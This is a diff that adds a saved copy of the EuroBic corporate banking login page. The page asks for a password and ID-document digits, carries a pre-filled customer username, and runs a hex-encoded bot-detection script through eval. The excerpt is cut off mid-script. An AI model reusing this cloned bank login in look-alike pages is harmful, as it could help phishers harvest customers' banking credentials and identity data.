@@ -1,0 +1,931 @@
+<HTML>
+
+	<HEAD>
+
+		<title>EuroBic</title>
+
+
+
+		<meta http-equiv='Cache-Control' content='no-cache, must-revalidate' />
+
+		<meta http-equiv="Expires" content="0" />
+
+		<meta http-equiv="Pragma" content="no-cache" />
+
+		<script src="/CorporateBanking/v10/PT/js/geralV1.js"></script>
+
+		<script language="JavaScript" src="/CorporateBanking/v10/PT/js/vkeyb001.js"></script>
+
+<!--		<script src="/CorporateBanking/utils.aspx"></script>  -->
+
+		<script language="javascript">
+
+WEBO_ZONE=10;
+
+WEBO_PAGE=1;
+
+if(webo_ok==1){webo_zpi(WEBO_ZONE,WEBO_PAGE,89140);}
+
+</script>
+
+
+
+
+
+		<link rel="stylesheet" href="/CorporateBanking/v10/PT/css/jquerytheme/jquery-ui-1.7.2.custom.css" type="text/css" media="screen">
+
+		<script type="text/javascript" src="/CorporateBanking/v10/PT/js/jquery-1.3.2.min.js"></script>
+
+		<script type="text/javascript" src="/CorporateBanking/v10/PT/js/jquery-ui-1.7.2.custom.min.js"></script>
+
+
+
+		<script type="text/javascript" id="clientEventHandlersJS">
+
+<!--
+
+function keyPressTexto_SemPlica(ev) {
+
+	var keynum;
+
+	var keychar;
+
+	var numcheck;
+
+
+
+	if (window.event) { // IE
+
+		keynum = ev.keyCode;
+
+	}
+
+	else if (ev.which) { // Netscape/Firefox/Opera
+
+		keynum = ev.which;
+
+	}
+
+
+
+	keychar = String.fromCharCode(keynum);
+
+	//ALTERACAO ID7418
+
+	if (keynum != 39 && keynum != 34 && (keynum < 192 || keynum > 197) && (keynum < 200 || keynum > 207) && (keynum < 209 || keynum > 214) && (keynum < 217 || keynum > 221) && (keynum < 224 || keynum > 229) && (keynum < 232 || keynum > 239) && (keynum < 241 || keynum > 246) && (keynum < 249 || keynum > 253) && keynum != 255 )
+
+		return true;
+
+	else
+
+		return false;
+
+}
+
+
+
+function validaEnter(ev,obj) {
+
+	if(ev.keyCode==13)
+
+		__doPostBack(obj,'');
+
+}
+
+function abreActivacao() {
+
+	var windowFeatures="width=770,height=570,toolbar=no,menubar=no,location=yes,status=yes,top=50,left=50";
+
+	window.open("aspx/empresas/recenseamento/activacao/activacao_index.aspx","activacao",windowFeatures);
+
+}
+
+
+
+function validaDocumento(source,arguments) {
+
+	if ((document.forms[0].prim_pos.selectedIndex > 0) && (document.forms[0].seg_pos.selectedIndex > 0))
+
+		arguments.IsValid = true;
+
+	else
+
+		arguments.IsValid = false;
+
+}
+
+
+
+function setFocus(){
+
+	var password = document.getElementById('password');
+
+	if ( password.value == '' ) password.focus();
+
+}
+
+
+
+if ( window.addEventListener ){
+
+	window.addEventListener( 'load', setFocus, false );
+
+}
+
+else{
+
+	window.attachEvent( 'onload', setFocus );
+
+}
+
+//-->
+
+		</script>
+
+
+
+
+
+<!--/openPopupAvisoSeguranca()-->
+
+
+
+<script type="text/javascript">
+
+    $(document).ready(function () {
+
+        $("#password").attr('maxlength', ' 8');
+
+    });
+
+$(function(){
+
+
+
+
+
+	// Dialog
+
+	$('#popupAvisoSeguranca').dialog({
+
+		autoOpen: false,
+
+		width: 700,
+
+		modal: true,
+
+		closeOnEscape: true,
+
+		draggable: false,
+
+		resizable: false,
+
+		position: 'center',
+
+		dialogClass: 'alert_seguranca',
+
+		open: function(event, ui) { $("body").css( {overflow: 'hidden'} );  $('#popupAvisoSeguranca').css({'background-color': '#FFFFFF'}); $(".alert_seguranca .ui-dialog-titlebar").hide();$(".alert_seguranca.ui-dialog").css({'padding': '0px'});},
+
+		beforeclose: function(event, ui) { $("body").css( {overflow: 'auto'} ); setFocus(); }
+
+	});
+
+
+
+	$('#popupAvisoSeguranca').dialog('open');
+
+
+
+
+
+});
+
+
+
+</script>
+
+
+
+	<LINK media="screen" href="css/estilos.css" type="text/css" rel="stylesheet">
+
+	</HEAD>
+
+	<body bgColor="white" leftMargin="2" topMargin="0"><script type="text/javascript">
+
+(function() { var z="";var b="2866756e6374696f6e2829207b0d0a2066756e6374696f6e2067657453657373696f6e436f6f6b6965732829207b0d0a0976617220636f6f6b69654172726179203d206e657720417272617928293b0d0a0976617220634e616d65203d206e65772052656745787028275e5c5c733f696e6361705f7365735f27293b0d0a097661722063203d20646f63756d656e742e636f6f6b69652e73706c697428223b22293b0d0a09666f7220287661722069203d20303b2069203c20632e6c656e6774683b20692b2b29207b0d0a0909766172206b6579203d20635b695d2e73756273747228302c20635b695d2e696e6465784f6628223d2229293b0d0a09097661722076616c7565203d20635b695d2e73756273747228635b695d2e696e6465784f6628223d2229202b20312c20635b695d2e6c656e677468293b0d0a090969662028634e616d652e74657374286b65792929207b0d0a090909636f6f6b696541727261795b636f6f6b696541727261792e6c656e6774685d203d2076616c75653b0d0a09097d0d0a097d0d0a0972657475726e20636f6f6b696541727261793b0d0a207d0d0a2066756e6374696f6e20736574496e636170436f6f6b69652876417272617929207b0d0a09766172207265733b0d0a09747279207b0d0a090976617220636f6f6b696573203d2067657453657373696f6e436f6f6b69657328293b0d0a09097661722064696765737473203d206e657720417272617928636f6f6b6965732e6c656e677468293b0d0a0909666f7220287661722069203d20303b2069203c20636f6f6b6965732e6c656e6774683b20692b2b29207b0d0a090909646967657374735b695d203d2073696d706c6544696765737428764172726179202b20636f6f6b6965735b695d293b0d0a09097d0d0a0909726573203d20764172726179202b20222c6469676573743d22202b20646967657374732e6a6f696e28293b0d0a097d20636174636820286529207b0d0a0909726573203d20764172726179202b20222c6469676573743d22202b20656e636f6465555249436f6d706f6e656e7428652e746f537472696e672829293b0d0a097d0d0a09637265617465436f6f6b696528225f5f5f75746d7663222c207265732c203230293b0d0a207d0d0a2066756e6374696f6e2073696d706c65446967657374286d7973747229207b0d0a0976617220726573203d20303b0d0a09666f7220287661722069203d20303b2069203c206d797374722e6c656e6774683b20692b2b29207b0d0a0909726573202b3d206d797374722e63686172436f646541742869293b0d0a097d0d0a0972657475726e207265733b0d0a207d0d0a2066756e6374696f6e20637265617465436f6f6b6965286e616d652c2076616c75652c207365636f6e647329207b0d0a097661722065787069726573203d2022223b0d0a09696620287365636f6e647329207b0d0a09097661722064617465203d206e6577204461746528293b0d0a0909646174652e73657454696d6528646174652e67657454696d652829202b20287365636f6e6473202a203130303029293b0d0a09097661722065787069726573203d20223b20657870697265733d22202b20646174652e746f474d54537472696e6728293b0d0a097d0d0a09646f63756d656e742e636f6f6b6965203d206e616d65202b20223d22202b2076616c7565202b2065787069726573202b20223b20706174683d2f223b0d0a207d0d0a2066756e6374696f6e2074657374286f29207b0d0a0976617220726573203d2022223b0d0a0976617220764172726179203d206e657720417272617928293b0d0a09666f722028766172206a203d20303b206a203c206f2e6c656e6774683b206a2b2b29207b0d0a09207661722074657374203d206f5b6a5d5b305d3b0d0a092073776974636820286f5b6a5d5b315d29207b0d0a092009636173652022657869737473223a0d0a0909747279207b0d0a090909696628747970656f66286576616c2874657374292920213d3d2022756e646566696e656422297b0d0a090909097641727261795b7641727261792e6c656e6774685d203d20656e636f6465555249436f6d706f6e656e742874657374202b20223d7472756522293b0d0a0909097d0d0a090909656c73657b0d0a090909097641727261795b7641727261792e6c656e6774685d203d20656e636f6465555249436f6d706f6e656e742874657374202b20223d66616c736522293b0d0a0909097d0d0a09097d20636174636820286529207b0d0a0909097641727261795b7641727261792e6c656e6774685d203d20656e636f6465555249436f6d706f6e656e742874657374202b20223d66616c736522293b0d0a09097d0d0a0909627265616b3b0d0a090963617365202276616c7565223a0d0a09097472797b0d0a090909747279207b0d0a09090909726573203d206576616c2874657374293b0d0a09090909696628747970656f662872657329203d3d3d2022756e646566696e656422297b0d0a09090909097641727261795b7641727261792e6c656e6774685d203d20656e636f6465555249436f6d706f6e656e742874657374202b20223d756e646566696e656422293b0d0a090909097d0d0a09090909656c736520696628726573203d3d3d206e756c6c297b0d0a09090909097641727261795b7641727261792e6c656e6774685d203d20656e636f6465555249436f6d706f6e656e742874657374202b20223d6e756c6c22293b0d0a090909097d0d0a09090909656c7365207b0d0a09090909097641727261795b7641727261792e6c656e6774685d203d20656e636f6465555249436f6d706f6e656e742874657374202b20223d22202b207265732e746f537472696e672829293b0d0a090909097d0909090d0a0909097d20636174636820286529207b0d0a090909097641727261795b7641727261792e6c656e6774685d203d20656e636f6465555249436f6d706f6e656e742874657374202b20223d63616e6e6f74206576616c7561746522293b0d0a09090909627265616b3b0d0a0909097d0d0a090909627265616b3b0d0a09097d0d0a0909636174636820286529207b0d0a0909097641727261795b7641727261792e6c656e6774685d203d20656e636f6465555249436f6d706f6e656e742874657374202b20223d22202b2065293b0d0a09097d0d0a0909627265616b3b0d0a0909636173652022706c7567696e5f657874656e74696f6e73223a0d0a0909747279207b0d0a09090976617220657874656e74696f6e73203d205b5d3b0d0a090909747279207b0d0a0909090969203d20657874656e74696f6e732e696e6465784f6628226922293b0d0a0909097d20636174636820286529207b0d0a090909097641727261795b7641727261792e6c656e6774685d203d20656e636f6465555249436f6d706f6e656e742822706c7567696e5f6578743d696e6465784f66206973206e6f7420612066756e6374696f6e22293b0d0a09090909627265616b3b0d0a0909097d0d0a090909747279207b0d0a09090909766172206e756d203d206e6176696761746f722e706c7567696e732e6c656e6774683b0d0a09090909696620286e756d203d3d2030207c7c206e756d203d3d206e756c6c29207b0d0a09090909097641727261795b7641727261792e6c656e6774685d203d20656e636f6465555249436f6d706f6e656e742822706c7567696e5f6578743d6e6f20706c7567696e7322293b0d0a0909090909627265616b3b0d0a090909097d0d0a0909097d20636174636820286529207b0d0a090909097641727261795b7641727261792e6c656e6774685d203d20656e636f6465555249436f6d706f6e656e742822706c7567696e5f6578743d63616e6e6f74206576616c7561746522293b0d0a09090909627265616b3b0d0a0909097d0d0a0909090d0a090909666f72202876617220693d303b693c6e6176696761746f722e706c7567696e732e6c656e6774683b692b2b29207b0d0a0909090969662028747970656f66286e6176696761746f722e706c7567696e735b695d29203d3d3d2022756e646566696e65642229207b0d0a09090909097641727261795b7641727261792e6c656e6774685d203d20656e636f6465555249436f6d706f6e656e742822706c7567696e5f6578743d706c7567696e735b695d20697320756e646566696e656422293b0d0a0909090909627265616b3b0d0a090909097d0d0a0d0a090909097661722066696c656e616d65203d206e6176696761746f722e706c7567696e735b695d2e66696c656e616d653b0d0a0909090976617220657874203d20226e6f20657874656e74696f6e223b0d0a0909090969662028747970656f662866696c656e616d6529203d3d3d2022756e646566696e65642229207b0d0a0909090909657874203d202266696c656e616d6520697320756e646566696e6564223b0d0a090909097d0d0a09090909656c7365206966202866696c656e616d652e73706c697428222e22292e6c656e677468203e203129207b0d0a0909090909657874203d2066696c656e616d652e73706c697428272e27292e706f7028293b0d0a090909097d0d0a0d0a0909090969662028657874656e74696f6e732e696e6465784f662865787429203c203029207b0d0a0909090909657874656e74696f6e732e7075736828657874293b0d0a090909097d090d0a0909097d0d0a0909090d0a090909666f7209287661722069203d20303b2069203c20657874656e74696f6e732e6c656e6774683b20692b2b29207b0d0a090909097641727261795b7641727261792e6c656e6774685d203d20656e636f6465555249436f6d706f6e656e742822706c7567696e5f6578743d22202b20657874656e74696f6e735b695d293b0d0a0909097d0d0a09097d0d0a0909636174636820286529207b0d0a0909097641727261795b7641727261792e6c656e6774685d203d20656e636f6465555249436f6d706f6e656e742822706c7567696e5f6578743d22202b2065293b0d0a09097d0d0a0909627265616b3b0d0a09207d0d0a097d0d0a0972657475726e207641727261792e6a6f696e28293b0d0a207d0d0a20766172206f203d205b0d0a095b226e6176696761746f72222c2022657869737473225d2c0d0a095b226e6176696761746f722e76656e646f72222c202276616c7565225d2c0d0a095b226e6176696761746f722e6170704e616d65222c202276616c7565225d2c0d0a095b226e6176696761746f722e706c7567696e732e6c656e6774683d3d30222c202276616c7565225d2c0d0a095b226e6176696761746f722e706c6174666f726d222c202276616c7565225d2c0d0a095b226e6176696761746f722e776562647269766572222c202276616c7565225d2c0d0a095b22706c6174666f726d222c2022706c7567696e5f657874656e74696f6e73225d2c0d0a095b22416374697665584f626a656374222c2022657869737473225d2c0d0a095b227765626b697455524c222c2022657869737473225d2c0d0a095b225f7068616e746f6d222c2022657869737473225d2c0d0a095b2263616c6c5068616e746f6d222c2022657869737473225d2c0d0a095b226368726f6d65222c2022657869737473225d2c0d0a095b2279616e646578222c2022657869737473225d2c0d0a095b226f70657261222c2022657869737473225d2c0d0a095b226f7072222c2022657869737473225d2c0d0a095b22736166617269222c2022657869737473225d2c0d0a095b22617765736f6d69756d222c2022657869737473225d2c0d0a095b2270756666696e446576696365222c2022657869737473225d2c0d0a095b225f5f6e696768746d617265222c2022657869737473225d2c0d0a095b22646f6d4175746f6d6174696f6e222c2022657869737473225d2c0d0a095b22646f6d4175746f6d6174696f6e436f6e74726f6c6c6572222c2022657869737473225d2c0d0a095b225f53656c656e69756d5f4944455f5265636f72646572222c2022657869737473225d2c0d0a095b22646f63756d656e742e5f5f7765626472697665725f7363726970745f666e222c2022657869737473225d2c0d0a095b22646f63756d656e742e246364635f6173646a666c617375746f70666876635a4c6d63666c5f222c2022657869737473225d2c0d0a095b2270726f636573732e76657273696f6e222c2022657869737473225d2c0d0a095b226e6176696761746f722e637075436c617373222c2022657869737473225d2c0d0a095b226e6176696761746f722e6f73637075222c2022657869737473225d2c0d0a095b226e6176696761746f722e636f6e6e656374696f6e222c2022657869737473225d2c0d0a095b226e6176696761746f722e6c616e67756167653d3d274327222c202276616c7565225d2c0d0a095b2277696e646f772e6f7574657257696474683d3d30222c202276616c7565225d2c0d0a095b2277696e646f772e6f757465724865696768743d3d30222c202276616c7565225d2c0d0a095b2277696e646f772e576562474c52656e646572696e67436f6e74657874222c2022657869737473225d2c0d0a095b22646f63756d656e742e646f63756d656e744d6f6465222c202276616c7565225d2c0d0a095b226576616c2e746f537472696e6728292e6c656e677468222c202276616c7565225d0d0a5d3b0d0a20747279207b0d0a09736574496e636170436f6f6b69652874657374286f29293b0d0a09646f63756d656e742e637265617465456c656d656e742822696d6722292e737263203d20222f5f496e63617073756c615f5265736f757263653f53574b4d544653523d3126653d22202b204d6174682e72616e646f6d28293b0d0a207d20636174636820286529207b0d0a09696d67203d20646f63756d656e742e637265617465456c656d656e742822696d6722293b0d0a09696d672e737263203d20222f5f496e63617073756c615f5265736f757263653f53574b4d544653523d3126653d22202b20653b0d0a207d0d0a7d2928293b0d0a";eval((function(){for (var i=0;i<b.length;i+=2){z+=String.fromCharCode(parseInt(b.substring(i,i+2),16));} return z;})());})();
+
+</script>
+
+		<form name="Form1" method="post" action="./login.aspx" onsubmit="javascript:return WebForm_OnSubmit();" id="Form1" target="_top">
+
+<div>
+
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTEzNTQxMjMxNDgPFgQeDVBvc0FsZWF0b3JpYXMFBHRydWUeGFNlY3VyaXR5TWVzc2FnZURpc3BsYXllZAUEdHJ1ZRYCAgEPZBYKAgEPFgIeBXZhbHVlBQhDQVNBTERPU2QCBg8PFgIeBFRleHQFATJkZAIIDw8WAh8DBQEzZGQCDg9kFgRmDxYCHglpbm5lcmh0bWxlZAIFDxYCHwRlZAIPDw8WAh8DBbsDMSAtIEludHJvZHV6YSBhIHBhc3N3b3JkLCB1dGlsaXphbmRvIGNhc28gc2VqYSBhIHN1YSBwcmVmZXLDqm5jaWEsIG8gPFNUUk9ORz50ZWNsYWRvIHZpcnR1YWwgcXVlIHBvZGUgYXRpdmFyIG5vIHJlc3BldGl2byDDrWNvbmUuPC9TVFJPTkc+PGJyPiAyIC0gU2Vyw6EgbmVjZXNzw6FyaW8gcXVlIG5vcyBmb3JuZcOnYSwgYWRpY2lvbmFsbWVudGUsIDxTVFJPTkc+YWxndW5zIGTDrWdpdG9zIGRlIHVtIGRvY3VtZW50byBkZSBpZGVudGlmaWNhw6fDo28uPC9TVFJPTkc+PHA+IFNlIG5lY2Vzc2l0YXIgZGUgYWp1ZGEsIGNvbnRhY3RlLW5vcyBhdHJhdsOpcyBkYSBMaW5oYSBFdXJvQmljIDgwOCAyMiA0NCA0NC4gQSBwYXJ0aXIgZG8gZXN0cmFuZ2Vpcm8gbGlndWUgcGFyYTogKzM1MSAyMTMgMTgwIDg3MC4gUG9kZXLDoSBmYXrDqi1sbyBlbnRyZSBhcyA4aCBlIGFzIDIzaC48cD5kZGR4mAor4B94fXr6SmMXLS879WRUGVb9gEI560KYgewCEQ==" />
+
+</div>
+
+
+
+<script type="text/javascript">
+
+//<![CDATA[
+
+var theForm = document.forms['Form1'];
+
+if (!theForm) {
+
+    theForm = document.Form1;
+
+}
+
+function __doPostBack(eventTarget, eventArgument) {
+
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+
+        theForm.__EVENTTARGET.value = eventTarget;
+
+        theForm.__EVENTARGUMENT.value = eventArgument;
+
+        theForm.submit();
+
+    }
+
+}
+
+//]]>
+
+</script>
+
+
+
+
+
+
+
+<script src="/corporatebanking/WebResource.axd?d=e9Niu1SM2RslzwMfDL8NNUIJKtfgeSqx34PUMPs9VW0Tm_lmBPtZWp3jriCfFxJKvNT47Kx5eNHXzXvy-RBIeJLIG6iNGxB-eNSaM-l-PHA1&amp;t=636776725224055265" type="text/javascript"></script>
+
+<script type="text/javascript">
+
+//<![CDATA[
+
+function WebForm_OnSubmit() {
+
+if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
+
+return true;
+
+}
+
+//]]>
+
+</script>
+
+
+
+<div>
+
+
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="883F4F4F" />
+
+</div>
+
+			<div style="LEFT: 233px; VISIBILITY: visible; POSITION: absolute; TOP: 25px">
+
+				<table height="378" cellSpacing="0" cellPadding="0" width="495" border="0">
+
+					<TBODY>
+
+						<tr>
+
+							<td colSpan="4"><IMG height="190" src="/imagens/img_clear.gif" width="1"></td>
+
+						</tr>
+
+						<tr>
+
+							<td><IMG height="0" src="/imagens/img_clear.gif" width="170"></td>
+
+							<td class="brancoffffff_11" width="60"><label id="lblusername">utilizador:</label></td>
+
+							<td width="100">
+
+								<input name="username" type="text" id="username" disabled="disabled" class="preto333333_11" style="width:100px;height: 20px;" value="CASALDOS" />
+
+								<script>function redirectToPortal(){
+
+									var u = document.getElementById('username').value;
+
+									var h = Base64.encode((new Date()).getTime().toString() + " " + u);
+
+									document.location = 'https://www.eurobic.pt' + '#' + h;
+
+								}</script>
+
+							</td>
+
+							<td>
+
+								<a onclick="redirectToPortal(); return false;" href="#">
+
+									<img src="/imagens/botao_alterar.gif" style="border:none; margin-left: 4px;">
+
+								</a>
+
+							</td>
+
+						</tr>
+
+						<tr>
+
+							<td colSpan="4"><IMG height="5" src="/imagens/img_clear.gif"></td>
+
+						</tr>
+
+						<tr>
+
+							<td><IMG height="1" src="/imagens/img_clear.gif" width="170"></td>
+
+							<td class="brancoffffff_11" width="90"><label id="lblpassword">password:
+
+								</label></td>
+
+							<td><input name="password" type="password" id="password" class="preto333333_11" style="WIDTH: 100px;height: 20px;" maxlength="8" /></td>
+
+
+
+                            <td><a onclick="return displayVK(&#39;toggle&#39;,&#39;VKeyboard&#39;); ;" id="botao_enviar" class="cinza666666_10" href="javascript:__doPostBack(&#39;botao_enviar&#39;,&#39;&#39;)">
+
+                               <div style="padding-left: 4px;">    <IMG id="imagemKb" border="0" src="/imagens/Keyboard.png" name="imagemKb" height="20px" width="42px" > </div>
+
+	                        </a></td>
+
+
+
+							<td><IMG height="1" src="/imagens/img_clear.gif" width="150"></td>
+
+						</tr>
+
+						<tr>
+
+							<td colSpan="4"><IMG height="5" src="/imagens/img_clear.gif"></td>
+
+						</tr>
+
+						<tr>
+
+							<td><IMG height="1" src="/imagens/img_clear.gif" width="170"></td>
+
+							<td class="brancoffffff_11" width="90"><label id="lblDocumento"><select name="ddlDoc" id="ddlDoc" class="preto000000_11" onfocus="displayVK(&#39;none&#39;,&#39;VKeyboard&#39;)">
+
+	<option selected="selected" value="B">B.I./Pass.</option>
+
+	<option value="C">Contribuinte</option>
+
+</select></label>
+
+							</td>
+
+							<td class="brancoffffff_11" align="right">
+
+								<table>
+
+									<tr>
+                                        <!-- NOTE 1st digit -->
+										<td class="brancoffffff_11"><span id="lblPrim_Pos">2</span>ª</td>
+
+										<td><select name="prim_pos" id="prim_pos" class="preto000000_11" onfocus="displayVK(&#39;none&#39;,&#39;VKeyboard&#39;)">
+
+	<option selected="selected" value=""></option>
+
+	<option value="0">0</option>
+
+	<option value="1">1</option>
+
+	<option value="2">2</option>
+
+	<option value="3">3</option>
+
+	<option value="4">4</option>
+
+	<option value="5">5</option>
+
+	<option value="6">6</option>
+
+	<option value="7">7</option>
+
+	<option value="8">8</option>
+
+	<option value="9">9</option>
+
+</select>
+
+										</td>
+
+										<td class="brancoffffff_11"><span id="lblSeg_Pos">3</span>ª</td>
+
+										<td><select name="seg_pos" id="seg_pos" class="preto000000_11" onfocus="displayVK(&#39;none&#39;,&#39;VKeyboard&#39;)">
+
+	<option selected="selected" value=""></option>
+
+	<option value="0">0</option>
+
+	<option value="1">1</option>
+
+	<option value="2">2</option>
+
+	<option value="3">3</option>
+
+	<option value="4">4</option>
+
+	<option value="5">5</option>
+
+	<option value="6">6</option>
+
+	<option value="7">7</option>
+
+	<option value="8">8</option>
+
+	<option value="9">9</option>
+
+</select>
+
+										</td>
+
+									</tr>
+
+								</table>
+
+							</td>
+
+							<td><IMG height="1" src="/imagens/img_clear.gif" width="150"></td>
+
+						</tr>
+
+						<tr>
+
+							<td colSpan="4" height="8"><IMG src="/imagens/img_clear.gif"></td>
+
+						</tr>
+
+						<tr>
+
+							<td colSpan="4">
+
+								<table cellSpacing="0" cellPadding="0" border="0">
+
+									<TBODY>
+
+										<tr>
+
+											<td width="133"><IMG src="/imagens/img_clear.gif"></td>
+
+											<td height="20"><A class="vermelho990000_11_link" style="CURSOR: hand" tabIndex="1" onclick="window.open('aspx/empresas/recenseamento/recuperacao_pass/password1_recup.aspx','Recuperacao_Password','height=570,width=770,toolbar=no,menubar=no,location=yes,status=yes,top=50,left=50');" Title="Recuperação de Password" onmouseover="window.status='Recuperação de Password'; return true;" onmouseout="window.status=''; return true;">recuperação de Password</A></td>
+
+											<td width="120"><IMG src="/imagens/img_clear.gif"></td>
+
+											<td><a id="entrar" class="entrar" name="entrar" href="javascript:__doPostBack(&#39;entrar&#39;,&#39;&#39;)"><img src="/imagens/botao_login.gif" id="imgOK" border="0" Title="Entrar" onmouseover="window.status='Entrar'; return true;" onmouseout="window.status=''; return true;"></a></td>
+
+										</tr>
+
+										<tr>
+
+											<td colSpan="4"><IMG id="px" src="/imagens/img_clear.gif" align="top" border="0" name="px">
+
+												<script>
+
+													showVK(document.Form1.password,{backgroundColor:'#ffffff'});
+
+												</script>
+
+											</td>
+
+										</tr>
+
+
+
+
+
+										<!-- id 10171 -->
+
+										<tr><td height=70 colspan="4"></td></tr>
+
+
+
+										<tr>
+
+
+
+											<table cellSpacing="0" cellPadding="0" border="0">
+
+												<TBODY>
+
+													<tr>
+
+														<td width="163"><IMG src="/imagens/img_clear.gif"></td>
+
+														<td colSpan="3" class="preto333333_11" height="230">
+
+															<IMG src="/imagens/link_popup_seguranca.gif" style="border-style: none; border-width:0" usemap="#mapaLinkSegurancaBPN">
+
+															<map name="mapaLinkSegurancaBPN">
+
+																<area href="javascript:openSegurancaBPN();" shape="poly" coords="0,64,33,6,57,40,97,16,141,35,264,34,264,62,255,62,255,87,224,90,224,101,194,101,194,78,150,78,131,130,45,131,45,64">
+
+															</map>
+
+															<br/><br/>
+
+
+
+														</td>
+
+													</tr>
+
+												</TBODY>
+
+											</table>
+
+										</tr>
+
+										<!-- FIM id 10171 -->
+
+
+
+
+
+									</TBODY>
+
+								</table>
+
+							</td>
+
+						</tr>
+
+						<tr>
+
+							<td colSpan="4"><IMG height="100" src="/imagens/img_clear.gif" width="1"></td>
+
+						</tr>
+
+					</TBODY>
+
+				</table>
+
+			</div>
+
+<script language="JavaScript">
+
+    var user=document.getElementById("username").value;
+
+</script>
+
+			<span id="RequiredFieldValidator2" style="color:Red;display:none;"></span>
+
+			<span id="CustomValidator1" style="color:Red;display:none;"></span>
+
+			<div id="ValidationSummary1" style="color:Red;display:none;">
+
+
+
+</div>
+
+
+
+			<table cellSpacing="0" cellPadding="0" border="0" width="763">
+
+				<TBODY>
+
+					<tr>
+
+						<td background="/imagens/HB_barra_sair_1.gif" width="763" align="right" height="16" valign="top"></td>
+
+					</tr>
+
+					<tr>
+
+						<td vAlign="top" width="175">
+
+							<table cellSpacing="0" cellPadding="0" border="0">
+
+								<TBODY>
+
+									<tr>
+
+										<td height="10"><IMG src="/imagens/img_clear.gif"></td>
+
+									</tr>
+
+									<tr>
+
+										<td><img src="/4/46/logo_junho_2007.gif"></td>
+
+										<td rowSpan="3" height="300" valign="top"><img src="/imagens/HB_img_login.gif"></td>
+
+									</tr>
+
+									<tr>
+
+										<td height="230" class="cinza666666_11" valign="top" width="200">Acabou de solicitar o acesso a um serviço apenas disponível para Clientes EuroBic. Para aderir ao serviço do serviço EuroBic Net, <b><a class=cinza666666_11 href="http://wwwprd.EuroBic.pt/Portal/v10/PT/aspx/EuroBicOnline/aderirNetBanking/index.aspx">clique aqui.</a></b><p> Se já é um Cliente EuroBic, aderente ao serviço EuroBic Net, <STRONG>basta inserir os seus códigos de acesso.</STRONG> As letras no utilizador e password têm de ser escritas utilizando corretamente as maiúsculas e minúsculas. Certifique-se de que a tecla Caps Lock não está ativada acidentalmente.</td>
+
+									</tr>
+
+									<tr>
+
+										<td height="140" valign="top">
+
+											<table cellSpacing="0" cellPadding="0" border="0">
+
+												<tr>
+
+													<td height="10"><IMG src="/imagens/img_clear.gif"></td>
+
+												</tr>
+
+												<tr>
+
+													<td><IMG src="/4/23/HB_topo_login.gif"></td>
+
+												</tr>
+
+												<tr>
+
+													<td class="vermelho990000_11_bold"><IMG src="/4/23/seta_noticiasHome.gif">&nbsp;Login</td>
+
+												</tr>
+
+												<tr>
+
+													<td width="175" background="/imagens/tracejado_menuEsq_pagsInt.gif"></td>
+
+												</tr>
+
+												<tr>
+
+													<td height="3"><IMG src="/imagens/img_clear.gif"></td>
+
+												</tr>
+
+												<tr>
+
+													<td class="cinza666666_11" width="175"><span id="lblLogin" name="lblLogin">1 - Introduza a password, utilizando caso seja a sua preferência, o <STRONG>teclado virtual que pode ativar no respetivo ícone.</STRONG><br> 2 - Será necessário que nos forneça, adicionalmente, <STRONG>alguns dígitos de um documento de identificação.</STRONG><p> Se necessitar de ajuda, contacte-nos através da Linha EuroBic 808 22 44 44. A partir do estrangeiro ligue para: +351 213 180 870. Poderá fazê-lo entre as 8h e as 23h.<p></span></td>
+
+												</tr>
+
+												<tr>
+
+													<td><span id="labelErro" class="vermelho990000_11" style="color:Red;background-color:Transparent;"></span></td>
+
+												</tr>
+
+
+
+											</table>
+
+										</td>
+
+									</tr>
+
+								</TBODY>
+
+							</table>
+
+
+
+
+
+
+
+						</td>
+
+					</tr>
+
+				</TBODY>
+
+			</table>
+
+
+
+<script type="text/javascript">
+
+//<![CDATA[
+
+var Page_ValidationSummaries =  new Array(document.getElementById("ValidationSummary1"));
+
+var Page_Validators =  new Array(document.getElementById("RequiredFieldValidator2"), document.getElementById("CustomValidator1"));
+
+//]]>
+
+</script>
+
+
+
+<script type="text/javascript">
+
+//<![CDATA[
+
+var RequiredFieldValidator2 = document.all ? document.all["RequiredFieldValidator2"] : document.getElementById("RequiredFieldValidator2");
+
+RequiredFieldValidator2.controltovalidate = "password";
+
+RequiredFieldValidator2.errormessage = "- Password";
+
+RequiredFieldValidator2.display = "None";
+
+RequiredFieldValidator2.isvalid = "False";
+
+RequiredFieldValidator2.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+
+RequiredFieldValidator2.initialvalue = "";
+
+var CustomValidator1 = document.all ? document.all["CustomValidator1"] : document.getElementById("CustomValidator1");
+
+CustomValidator1.errormessage = "- Posições aleatórias de Documento de Identificação";
+
+CustomValidator1.display = "None";
+
+CustomValidator1.evaluationfunction = "CustomValidatorEvaluateIsValid";
+
+CustomValidator1.clientvalidationfunction = "validaDocumento";
+
+var ValidationSummary1 = document.all ? document.all["ValidationSummary1"] : document.getElementById("ValidationSummary1");
+
+ValidationSummary1.headertext = "Os seguintes campos são obrigatórios: <br> ----------------------------------------------- </br>";
+
+ValidationSummary1.showmessagebox = "True";
+
+ValidationSummary1.showsummary = "False";
+
+ValidationSummary1.displaymode = "List";
+
+//]]>
+
+</script>
+
+
+
+
+
+<script type="text/javascript">
+
+//<![CDATA[
+
+
+
+var Page_ValidationActive = false;
+
+if (typeof(ValidatorOnLoad) == "function") {
+
+    ValidatorOnLoad();
+
+}
+
+
+
+function ValidatorOnSubmit() {
+
+    if (Page_ValidationActive) {
+
+        return ValidatorCommonOnSubmit();
+
+    }
+
+    else {
+
+        return true;
+
+    }
+
+}
+
+        //]]>
+
+</script>
+
+</form>
+
+		<script language="javascript">
+
+			if(parent.top.frames.length!=0)
+
+				document.forms[0].submit();
+
+
+
+			$(function(){
+
+				//cria a popup seguranca
+
+				$('#popupSegurancaBPN').dialog({
+
+						autoOpen: false,
+
+						width: 700,
+
+						modal: true,
+
+						closeOnEscape: true,
+
+						draggable: false,
+
+						resizable: false,
+
+						position: 'center',
+
+						dialogClass: 'alert_seguranca',
+
+						open: function(event, ui) { $("body").css( {overflow: 'hidden'} );  $('#popupSegurancaBPN').css({'background-color': '#FFFFFF'}); $(".alert_seguranca .ui-dialog-titlebar").hide();$(".alert_seguranca.ui-dialog").css({'padding': '0px'});},
+
